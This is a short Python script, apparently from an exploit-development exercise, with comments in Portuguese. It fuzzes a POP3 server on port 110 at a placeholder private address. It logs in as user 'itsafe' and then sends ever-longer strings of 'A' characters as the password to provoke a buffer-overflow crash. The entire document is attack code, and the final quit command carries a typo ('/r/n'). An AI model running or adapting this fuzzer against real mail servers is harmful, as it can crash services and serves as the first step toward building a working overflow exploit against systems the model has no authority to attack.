#!/usr/bin/python
import socket

buffer=["A"]
counter=100
while len(buffer) <= 30:
    buffer.append("A" * counter)
    counter += 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.x.x', 110))
s.recv(1024)



for string in buffer:
    print("Fuzzing the pass with {} bytes".format(len(string)))
    s.send('user itsafe\r\n'.encode('utf-8'))  # Enviando 'user' em letras minúsculas
    s.recv(1024)
    s.send(b'pass ' + str(string).encode('utf-8') + b'\r\n')
    s.recv(1024)

s.send(b"quit/r/n")  # Enviando 'quit' em letras minúsculas
s.close()
